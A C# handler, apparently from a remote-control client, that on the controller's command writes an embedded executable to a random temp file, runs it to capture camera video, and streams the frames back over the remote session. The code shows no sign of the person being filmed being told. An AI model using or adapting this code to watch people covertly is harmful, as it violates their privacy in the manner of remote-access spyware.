using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Linq;
using System.Text;
using System.Threading;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    class RequestCaptureVideoHandler : AbstractRequestHandler
    {
        private bool _isRunning = false;
        private RequestStartCaptureVideo _request = null;
        private string _lastVideoCapturePathStoreFile;
        private string _lastVideoCaptureExeFile = null;

        public RequestCaptureVideoHandler()
        {
            _lastVideoCapturePathStoreFile = GetTempPath() + "\\vcpsf.dat";
        }

        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_START_CAPTURE_VIDEO_REQUEST)
            {
                // 开始捕获
                var req = reqObj as RequestStartCaptureVideo;
                if (_request == null)
                {
                    // 第一次发送启动监控请求，则创建监控线程
                    _request = req;
                    _isRunning = true;
                    RunTaskThread(StartCapture, session);
                }
                else
                {
                    // 非第一次发送启动监控请求，则修改相关参数
                    _request.Fps = req.Fps;
                }
            }
            else if (reqType == ePacketType.PACKET_STOP_CAPTURE_VIDEO_REQUEST)
            {
                // 停止捕获
                _isRunning = false;
                _request = null;
            }
        }

        private void StartCapture(SocketSession session)
        {
            // 关闭上次打开的程序
            Console.WriteLine("当前lastVideoCaptureExeFile：" + _lastVideoCaptureExeFile);
            if (_lastVideoCaptureExeFile == null)
            {
                if (System.IO.File.Exists(_lastVideoCapturePathStoreFile))
                {
                    _lastVideoCaptureExeFile = System.IO.File.ReadAllText(_lastVideoCapturePathStoreFile);
                    Console.WriteLine("读取到store文件：" + _lastVideoCaptureExeFile);
                }
            }
            if (_lastVideoCaptureExeFile != null)
            {
                string processName = System.IO.Path.GetFileNameWithoutExtension(_lastVideoCaptureExeFile);
                ProcessUtil.KillProcess(processName.ToLower());
            }
            // 释放并打开视频程序
            byte[] data = ResUtil.GetResFileData(RES_FILE_NAME);
            string fileName = ResUtil.WriteToRandomFile(data, "camc.exe");
            _lastVideoCaptureExeFile = fileName;
            System.IO.File.WriteAllText(_lastVideoCapturePathStoreFile, fileName);
            ProcessUtil.RunByCmdStart(fileName + " camcapture /fps:" + _request.Fps, true);
            // 查找视频程序的端口
            string pName = System.IO.Path.GetFileNameWithoutExtension(_lastVideoCaptureExeFile);
            DoOutput("已启动视频监控程序：" + pName);
            int port = -1;
            int tryTimes = 0;
            while (tryTimes < 60)
            {
                port = FindServerPortByProcessName(pName);
                DoOutput("视频端口：" + port);
                if (port != -1)
                    break;
                Thread.Sleep(1000);
                tryTimes++;
            }
            if (port == -1)
            {
                _isRunning = false;
                return;
            }
            CaptureVideoClient.MessagerReceived += (o, args) =>
                {
                    try
                    {
                        var p = o as List<byte>;
                        var resp = new ResponseStartCaptureVideo();
                        resp.CollectTime = new DateTime(BitConverter.ToInt64(p.ToArray(), 0));
                        p.RemoveRange(0, 8);
                        resp.ImageData = p.ToArray();
                        if (resp.ImageData != null)
                        {
                            DoOutput("接收到视频数据" + resp.ImageData.Length);
                        }

                        session.Send(ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE, resp);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("CaptureVideoClient.MessagerReceived，" + ex.Message);
                    }
                };
            try
            {
                CaptureVideoClient.Connect("127.0.0.1", port);
                DoOutput("已经连接上视频服务");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            // 检测是否已经关闭监控视频，并退出服务，结束视频服务程序
            while (true)
            {
                if (!_isRunning)
                {
                    DoOutput("已关闭视频监控数据传输连接!");
                    CaptureVideoClient.Close();
                    if (_lastVideoCaptureExeFile != null)
                    {
                        string processName = System.IO.Path.GetFileNameWithoutExtension(_lastVideoCaptureExeFile);
                        ProcessUtil.KillProcess(processName.ToLower());
                    }
                    break;
                }
                Thread.Sleep(1000);
            }
            _isRunning = false;
        }
    }
}
